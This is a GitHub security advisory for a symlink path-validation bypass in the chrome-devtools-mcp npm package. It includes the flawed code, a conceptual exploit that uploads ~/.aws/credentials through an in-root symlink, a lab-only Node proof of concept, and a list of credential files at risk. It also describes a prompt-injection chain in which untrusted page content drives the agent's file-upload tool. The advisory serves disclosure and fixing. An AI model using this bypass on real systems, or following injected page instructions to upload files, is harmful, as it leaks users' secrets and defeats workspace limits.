# [M] chrome-devtools-mcp: validatePath() does not canonicalize symlinks before enforcing roots

## Summary
Severity: Medium
Advisory: GHSA-8qf9-62x2-82pp
CVE: CVE-2026-53766
CWE: CWE-22, CWE-59
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-8qf9-62x2-82pp
Type: github-advisory

## Affected
- npm: `chrome-devtools-mcp` — affected >=0.24.0 <1.1.0

## Details
### Summary

I originally reported this through Google Bug Hunters. The Google Bug Hunters team said this is in OSS VRP scope but not reward-eligible due to the project tier, and asked me to file an issue or PR directly with this repository. I am reporting it privately here first because it is an unfixed security issue.

`McpContext.validatePath()` enforces workspace `roots` by checking whether `path.resolve(filePath)` textually falls under one of the configured root paths. `path.resolve()` does not canonicalize symbolic links. As a result, a symlink inside a configured workspace root can point to a file outside that root, pass validation, and then be followed by downstream file read/write operations.

This bypass applies even when the MCP client correctly declares the `roots` capability with a non-empty list. It is separate from the documented legacy behavior where missing `roots` capability allows all paths.

The practical impact is a workspace-boundary bypass. In the write direction, filePath-writing tools can overwrite out-of-root files through an in-root symlink. In the read direction, `upload_file` can read through the symlink and send the file to the currently selected web page.

### Details

Affected code:

`src/McpContext.ts:178-199`

```ts
validatePath(filePath?: string): void {
  if (filePath === undefined) {
    return;
  }
  const roots = this.roots();
  if (roots === undefined) {
    return;
  }
  const absolutePath = path.resolve(filePath);
  for (const root of roots) {
    const rootPath = path.resolve(fileURLToPath(root.uri));
    if (
      absolutePath === rootPath ||
      absolutePath.startsWith(rootPath + path.sep)
    ) {
      return;
    }
  }
  throw new Error(
    `Access denied: path ${filePath} is not within any of the workspace roots ${JSON.stringify(roots)}.`,
  );
}
```

`path.resolve()` only normalizes path text such as `.` and `..`. It does not call `realpath()` and does not resolve symlinks. Therefore, a path like:

```text
/workspace/project/cache/profile
```

can textually pass the `/workspace` prefix check even when `cache/profile` is a symlink to:

```text
/home/user/.aws/credentials
```

Downstream consumers then perform real filesystem operations without `O_NOFOLLOW`:

- `src/McpContext.ts:720-738` `saveFile()` uses `fs.mkdir({recursive: true})` and `fs.writeFile()`.
- `src/tools/input.ts:454-497` `upload_file` calls `puppeteer.uploadFile(filePath)` or `fileChooser.accept([filePath])`.
- Other filePath-writing tools include screenshots, heap snapshots, network response save paths, snapshots, screencasts, Lighthouse output, and performance trace saves.

This is not a TOCTOU/race condition. The symlink exists before validation and the PoC uses a single process. The issue is a canonicalization bypass / improper link resolution.

Preconditions:

- The MCP client declares `roots` and supplies at least one workspace root.
- A symlink exists inside the workspace and points outside the workspace.
- For the remote prompt-injection chain, the user processes untrusted page content while chrome-devtools-mcp is connected.

A remote attacker does not need local access if a suitable workspace-internal symlink already exists, or if another trusted tool/workflow can create it. Without such a symlink, the issue is a local/workspace-state-dependent boundary bypass.

### PoC

Conceptual exploitation with a configured root:

```text
Configured roots:
  file:///workspace

Workspace path:
  /workspace/project/cache/profile -> /home/user/.aws/credentials

Tool call:
  upload_file({
    filePath: "/workspace/project/cache/profile",
    uid: "<file input element on current page>"
  })

Result:
  validatePath() accepts the path because it textually starts with /workspace.
  Puppeteer follows the symlink and uploads the target file to the page.
```

Lab-only PoC that replicates the exact validation logic and subsequent write. It writes only inside a fresh temporary directory and touches no system paths:

```js
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');
const {pathToFileURL, fileURLToPath} = require('node:url');

const lab = fs.mkdtempSync(path.join(os.tmpdir(), 'cdtmcp-lab-'));

try {
  fs.chmodSync(lab, 0o755);

  const workspace = path.join(lab, 'workspace');
  fs.mkdirSync(workspace);

  const outside = path.join(lab, 'outside-secret.txt');
  fs.writeFileSync(outside, 'sensitive outside content\n');

  const symlinkInside = path.join(workspace, 'innocent.txt');
  fs.symlinkSync(outside, symlinkInside);

  function validatePath(filePath, roots) {
    const absolutePath = path.resolve(filePath);
    for (const root of roots) {
      const rootPath = path.resolve(fileURLToPath(root.uri));
      if (
        absolutePath === rootPath ||
        absolutePath.startsWith(rootPath + path.sep)
      ) {
        return true;
      }
    }
    throw new Error(`Access denied: ${filePath}`);
  }

  const roots = [{uri: pathToFileURL(workspace).href, name: 'workspace'}];
  validatePath(symlinkInside, roots);

  fs.writeFileSync(symlinkInside, 'OVERWRITTEN BY MCP\n');

  console.log(fs.readFileSync(outside, 'utf8'));
  // -> "OVERWRITTEN BY MCP"
} finally {
  fs.rmSync(lab, {recursive: true, force: true});
}
```

Observed result:

```text
validatePath() accepts the in-root symlink path.
The subsequent write follows the symlink and modifies the out-of-root target.
```

I can provide an end-to-end MCP client reproduction if needed. The lab PoC above demonstrates the root cause using the same validation logic as the server.

### Impact

Who can exploit:

- A local process/user or trusted workflow that can create a symlink inside the workspace.
- A remote page/prompt-injection attacker, if a suitable workspace-internal symlink already exists or can be created by another trusted workflow/tool.

Security impact:

- Integrity: tools that write to `filePath` can overwrite files outside the configured workspace root through an in-root symlink.
- Confidentiality: `upload_file` can read a file outside the workspace through an in-root symlink and attach it to a file input on the current page.
- Stealth/auditability: the exfiltration path goes through normal page file-upload behavior, and chrome-devtools-mcp does not appear to log the canonical path that was uploaded.

Example sensitive files reachable if symlinked into the workspace:

- Cloud credentials such as `~/.aws/credentials`, `~/.config/gcloud/...`, or `~/.azure/...`.
- SSH private keys or `.ssh` files readable by the user.
- Project secrets such as `.env`, `.npmrc`, `.netrc`, `secrets.json`, and API tokens.
- Out-of-workspace source files or configuration files.

Severity:

- Suggested GitHub severity: Moderate.
- CVSS v3.1 chain estimate: `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N`.
- AC:H reflects that a workspace-internal symlink must exist at validation time.

Suggested fix:

Canonicalize paths before comparing against roots. For an existing file, use `fs.realpath()` on the path. For a new file, resolve the parent directory with `fs.realpath()` and re-join the basename.

```ts
async validatePath(filePath?: string): Promise<void> {
  if (filePath === undefined) return;
  const roots = this.roots();
  if (roots === undefined) return;

  const abs = path.resolve(filePath);
  let canonical;
  try {
    canonical = await fs.realpath(abs);
  } catch (err) {
    if (err.code === 'ENOENT') {
      const parent = await fs.realpath(path.dirname(abs));
      canonical = path.join(parent, path.basename(abs));
    } else {
      throw err;
    }
  }

  for (const root of roots) {
    const canonicalRoot = await fs.realpath(fileURLToPath(root.uri));
    if (
      canonical === canonicalRoot ||
      canonical.startsWith(canonicalRoot + path.sep)
    ) {
      return;
    }
  }

  throw new Error(
    `Access denied: ${filePath} (canonical: ${canonical}) is not within any workspace root.`,
  );
}

## References
- https://github.com/ChromeDevTools/chrome-devtools-mcp/security/advisories/GHSA-8qf9-62x2-82pp
- https://nvd.nist.gov/vuln/detail/CVE-2026-53766
- https://github.com/ChromeDevTools/chrome-devtools-mcp/pull/2127
- https://github.com/ChromeDevTools/chrome-devtools-mcp/commit/176eb695137d9c46a61e2d4d5571880c5145cf46
- https://github.com/ChromeDevTools/chrome-devtools-mcp
- https://github.com/ChromeDevTools/chrome-devtools-mcp/releases/tag/chrome-devtools-mcp-v1.1.0
